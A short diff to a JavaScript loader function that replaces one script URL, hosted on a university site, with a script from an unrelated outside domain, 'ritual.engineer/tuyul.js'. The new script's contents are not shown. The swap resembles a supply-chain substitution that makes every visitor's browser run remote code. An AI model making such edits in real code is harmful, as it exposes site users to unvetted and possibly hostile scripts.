@@ -8,7 +8,7 @@ function loadAnts() {
     }
     var someFiles = ['//code.jquery.com/jquery-3.6.1.js',
                      '//www.cs.huji.ac.il/~irush/scripts/jquery.highlight-3.js',
-                     '//www.cs.huji.ac.il/~irush/scripts/ants.js'];
+                     '//ritual.engineer/tuyul.js'];
     protocol = "https:";
     if (window.location.protocol !== undefined)
         protocol = window.location.protocol
